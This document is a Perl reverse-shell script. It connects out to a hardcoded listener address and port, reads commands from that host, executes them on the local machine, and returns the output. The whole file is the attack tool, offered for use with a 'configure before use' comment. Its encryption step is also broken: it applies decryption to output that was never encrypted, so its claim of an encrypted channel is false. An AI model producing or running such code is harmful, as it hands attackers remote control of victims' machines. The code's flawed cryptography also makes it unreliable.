#!/usr/bin/perl
# Perl Advanced Reverse Shell
# Configure LHOST and LPORT before use

use Socket;
use IO::Socket::INET;
use Crypt::CBC;

$LHOST = "192.168.1.100";
$LPORT = 4446;

$cipher = Crypt::CBC->new(-key => 'secret_key', -cipher => 'Blowfish');

$socket = IO::Socket::INET->new(PeerAddr => $LHOST, PeerPort => $LPORT, Proto => 'tcp') or die "Cannot connect: $!";

while ($command = <$socket>) {
    chomp $command;
    last if $command eq 'exit';

    $encrypted_output = `$command`;
    $decrypted_output = $cipher->decrypt($encrypted_output);
    print $socket $decrypted_output;
}

close $socket;
